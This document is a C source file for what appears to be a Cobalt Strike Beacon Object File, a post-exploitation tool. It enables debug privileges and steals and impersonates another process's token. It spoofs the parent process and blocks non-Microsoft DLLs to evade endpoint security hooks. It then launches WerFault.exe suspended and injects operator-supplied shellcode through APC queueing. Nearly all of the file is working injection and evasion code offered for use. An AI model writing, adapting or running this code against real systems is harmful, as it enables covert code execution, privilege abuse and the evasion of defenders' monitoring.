#include <windows.h>
#include <stdio.h>
#include "beacon.h"
#include "bofdefs.h"
#pragma warning( disable : 4996)

//#define PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY 0x20007
//#define PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON 0x100000000000

int go(IN PCHAR Buffer, IN ULONG Length)
{   
    DWORD   dwDupeProcessId = 0;
    DWORD   dwParentProcessId = 0;
    LPBYTE  lpShellcodeBuffer = NULL;
    DWORD   dwShellcodeBufferSize = 0;
    size_t  sclen = 0;
    
	datap parser;
	BeaconDataParse(&parser, Buffer, Length);

    dwDupeProcessId = BeaconDataInt(&parser);
    dwParentProcessId = BeaconDataInt(&parser);
    lpShellcodeBuffer = (LPBYTE) BeaconDataExtract(&parser, NULL);
    sclen = BeaconDataInt(&parser);

    STARTUPINFOA si;
    STARTUPINFOEXA six;
    PROCESS_INFORMATION pi;
    size_t attrsize = 0;
    SECURITY_ATTRIBUTES lpa;
    SECURITY_ATTRIBUTES lta;
    memset(&pi, 0, sizeof(PROCESS_INFORMATION));
    memset(&si, 0, sizeof(STARTUPINFO));
    memset(&six, 0, sizeof(STARTUPINFOEX));
    six.StartupInfo.cb = sizeof(STARTUPINFOEX);
    memset(&lpa, 0, sizeof(SECURITY_ATTRIBUTES));
    memset(&lta, 0, sizeof(SECURITY_ATTRIBUTES));
    lpa.nLength = sizeof(SECURITY_ATTRIBUTES);
    lta.nLength = sizeof(SECURITY_ATTRIBUTES);
    HANDLE NewToken;

    //Initialize Process Thread Attribute List so we can edit and provide extended startup info
    InitializeProcThreadAttributeList(NULL, 2, 0, &attrsize);

    PPROC_THREAD_ATTRIBUTE_LIST pAttrList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attrsize);

    if (!pAttrList)
    {
        return 1;
    }

    if (!InitializeProcThreadAttributeList(pAttrList, 2, 0, &attrsize))
    {
        DeleteProcThreadAttributeList(pAttrList);
        return 1;
    }

    //Set block non microsoft binaries
    DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
    UpdateProcThreadAttribute(pAttrList, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &policy, sizeof(policy), NULL, NULL);

    //Enable SeDebug
    HANDLE Token;

    OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &Token);
    LUID Luid;

    LookupPrivilegeValueA(NULL, SE_DEBUG_NAME, &Luid);
    TOKEN_PRIVILEGES NewState;
    NewState.PrivilegeCount = 1;
    NewState.Privileges[0].Luid = Luid;
    NewState.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    AdjustTokenPrivileges(Token, FALSE, &NewState, sizeof(NewState), NULL, NULL);
    CloseHandle(Token);

    //Open DupeProcess and duplicate token to be used with CreateProcessAsUserA. Also impersonate it because we need SeAssignPrimaryTokenPrivilege and SeTcbPrivilege
    HANDLE DupeToken;

    HANDLE DupeHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, dwDupeProcessId);
    if(!OpenProcessToken(DupeHandle, TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_DUPLICATE, &DupeToken))
    {
        BeaconPrintf(CALLBACK_ERROR, "[!] Could not open session process token with required rights. Aborting.");
        CloseHandle(DupeHandle);
        return 1;
    }

    DuplicateTokenEx(DupeToken, MAXIMUM_ALLOWED, 0, SecurityImpersonation, TokenImpersonation, &NewToken);
    ImpersonateLoggedOnUser(DupeToken);
    CloseHandle(DupeHandle);
    CloseHandle(DupeToken); 

    //Enable SeAssignPrimaryToken in our impersonated token
    HANDLE hThread;
    OpenThreadToken(GetCurrentThread(), TOKEN_QUERY | TOKEN_ASSIGN_PRIMARY | TOKEN_ADJUST_PRIVILEGES, TRUE, &hThread);
    LookupPrivilegeValueA(NULL, SE_ASSIGNPRIMARYTOKEN_NAME, &Luid);

    NewState.PrivilegeCount = 1;
    NewState.Privileges[0].Luid = Luid;
    NewState.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    AdjustTokenPrivileges(hThread, FALSE, &NewState, sizeof(NewState), NULL, NULL);
    if(GetLastError() == ERROR_NOT_ALL_ASSIGNED)
    {
        BeaconPrintf(CALLBACK_ERROR, "[!] Session Process Token does not have SE_ASSIGNPRIMARYTOKEN_NAME Privilege. Aborting.");
        CloseHandle(hThread);
        RevertToSelf();
        return 1;
    }

    CloseHandle(hThread);

    //Get handle to parent process
    HANDLE hPProcess = OpenProcess(PROCESS_CREATE_PROCESS | PROCESS_DUP_HANDLE, FALSE, dwParentProcessId);
    if(!hPProcess)
    {
        BeaconPrintf(CALLBACK_ERROR, "[!] Could not open Parent Process with PROCESS_CREATE_PROCESS access.  Aborting.");
        RevertToSelf();
        return 1;
    }

    //Update ProcThreadAttributeList with PPID
    UpdateProcThreadAttribute(pAttrList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hPProcess, sizeof(HANDLE), NULL, NULL);

    //Update struct with attribute list
    six.lpAttributeList = pAttrList;

    //Logic to determine where to spawn WerFault from based on Process and System architecture
    char program1[100];
    char homedir[] = "c:\\Windows\\System32";

    SYSTEM_INFO systemInfo;
    GetNativeSystemInfo(&systemInfo);
    //If we are on x86 machine we will call werfault from system32
    if(systemInfo.wProcessorArchitecture == 0)
    {
        sprintf_s(program1, 100, "c:\\Windows\\System32\\WerFault.exe");
    }
    //Otherwise we are on x64
    else
    {
        //Get arch of beacon
	    GetSystemInfo(&systemInfo);
        //If beacon is x86, call werfault from syswow64
        if(systemInfo.wProcessorArchitecture == 0)
        {
            sprintf_s(program1, 100, "c:\\Windows\\SysWOW64\\WerFault.exe");
        }
        //Otherwise call werfault from system32
        else
        {
            sprintf_s(program1, 100, "c:\\Windows\\System32\\WerFault.exe");
        }
    }

    if (!CreateProcessAsUserA(NewToken, NULL, program1, &lpa, &lta, TRUE, EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED, NULL, homedir, &six.StartupInfo, &pi))
    {
        BeaconPrintf(CALLBACK_ERROR, "[!] CreateProcessAsUser Failed!: %lu\n", GetLastError());
        RevertToSelf();
        DeleteProcThreadAttributeList(pAttrList);
        CloseHandle(NewToken);
        CloseHandle(hPProcess);
        return 1;
    }

    //Cleanup
    DeleteProcThreadAttributeList(pAttrList);
    CloseHandle(hPProcess);

    SIZE_T sz = 0;
    LPVOID memaddress;
    memaddress = ((void*)0);
    //Allocate space in spawned process
    NTSTATUS result = NtAllocateVirtualMemory(pi.hProcess, &memaddress, 0, &sclen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    //Write shellcode to spawned process
    result = NtWriteVirtualMemory(pi.hProcess, memaddress, (PVOID)lpShellcodeBuffer, sclen, &sz);

    //Change memory protections to Execute_Read
    ULONG oldprotect = 0;
    result = NtProtectVirtualMemory(pi.hProcess, &memaddress, (PSIZE_T)&sclen, PAGE_EXECUTE_READ, &oldprotect);

    //Que thread for execution
    result = NtQueueApcThread(pi.hThread, memaddress, NULL, NULL, NULL);

    //Execute thread
    result = NtResumeThread(pi.hThread, NULL);

    RevertToSelf();
}
